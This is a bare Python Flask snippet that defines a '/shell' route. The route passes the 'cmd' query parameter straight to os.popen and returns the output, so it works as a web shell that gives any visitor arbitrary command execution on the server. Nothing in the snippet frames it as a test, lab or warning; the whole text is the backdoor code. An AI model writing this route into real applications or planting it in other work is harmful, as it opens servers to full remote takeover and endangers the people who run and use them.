```python
@app.route('/shell')
def shell():
    cmd = request.args.get('cmd')
    output = os.popen(cmd).read()
    return output
```